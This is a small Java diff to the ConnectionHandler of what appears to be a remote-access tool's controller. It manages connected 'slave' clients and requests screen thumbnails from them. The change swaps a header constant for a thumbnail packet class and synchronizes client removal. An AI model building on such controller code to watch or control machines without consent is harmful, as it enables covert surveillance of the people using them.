@@ -5,7 +5,7 @@ import com.redpois0n.SampleMode;
 import com.redpois0n.Slave;
 import com.redpois0n.Sound;
 import com.redpois0n.exceptions.CloseException;
-import com.redpois0n.packets.outgoing.Header;
+import com.redpois0n.packets.outgoing.Packet40Thumbnail;
 import com.redpois0n.plugins.PluginEventHandler;
 import com.redpois0n.ui.frames.Frame;
 import com.redpois0n.utils.TrayIconUtils;
@@ -20,7 +20,7 @@ public class ConnectionHandler {
 		
 		if (Frame.thumbnails) {
 			icon = "...";
-			slave.addToSendQueue(Header.THUMBNAIL);
+			slave.addToSendQueue(new Packet40Thumbnail());
 		} else {
 			icon = slave.getCountry();
 		}
@@ -37,7 +37,7 @@ public class ConnectionHandler {
 		PluginEventHandler.onConnect(slave);
 	}
 
-	public static void removeSlave(Slave client, Exception e) {
+	public synchronized static void removeSlave(Slave client, Exception e) {
 		if (SampleMode.isInSampleMode()) {
 			return;
 		}
